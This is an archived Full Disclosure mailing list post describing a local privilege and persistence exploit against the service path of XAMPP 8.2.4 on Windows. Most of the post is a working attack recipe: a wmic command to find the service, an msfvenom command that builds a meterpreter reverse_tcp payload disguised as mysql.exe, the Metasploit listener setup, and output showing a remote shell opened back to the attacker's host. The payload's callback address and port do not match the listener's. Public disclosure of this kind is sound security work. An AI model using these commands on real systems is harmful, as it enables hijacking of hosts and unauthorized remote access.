---
title: Unquoted Path - XAMPP 8.2.4
url: https://seclists.org/fulldisclosure/2023/Jul/18
source: Full Disclosure
date: 2023-07-12
fetch_date: 2025-10-04T11:56:51.575846
---

# Unquoted Path - XAMPP 8.2.4

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# Unquoted Path - XAMPP 8.2.4

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 9 Jul 2023 15:32:49 +0300

---

```
# Exploit Title: XAMPP 8.2.4 - Unquoted Path
# Date: 07/2023
# Exploit Author: Andrey Stoykov
# Version: 8.2.4
# Software Link:
https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.2.4/xampp-windows-x64-8.2.4-0-VS16-installer.exe
# Tested on: Windows Server 2022
# Blog: http://msecureltd.blogspot.com/

Steps to Exploit:

1. Search for unquoted paths
2. Generate meterpreter shell
3. Copy shell to XAMPP directory replacing "mysql.exe"
4. Exploit by double clicking on shell

C:\Users\astoykov>wmic service get name,displayname,pathname,startmode
|findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

mysql
        mysql
C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
mysql            Auto

// Generate shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.16 lport=4444
-f exe -o mysql.exe

// Setup listener
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 192.168.1.13
msf6 exploit(multi/handler) > set lport 4443
msf6 exploit(multi/handler) > set payload meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.13:4443
[*] Sending stage (175686 bytes) to 192.168.1.11
[*] Meterpreter session 1 opened (192.168.1.13:4443 -> 192.168.1.11:49686)
at 2023-07-08 03:59:40 -0700

meterpreter > getuid
Server username: WIN-5PT4K404NLO\astoykov
meterpreter > getpid
Current pid: 4724
meterpreter > shell
Process 5884 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1]
(c) Microsoft Corporation. All rights reserved.
[...]
C:\xampp\mysql\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80B5-B405

 Directory of C:\xampp\mysql\bin
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

### Current thread:

* **Unquoted Path - XAMPP 8.2.4** *Andrey Stoykov (Jul 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")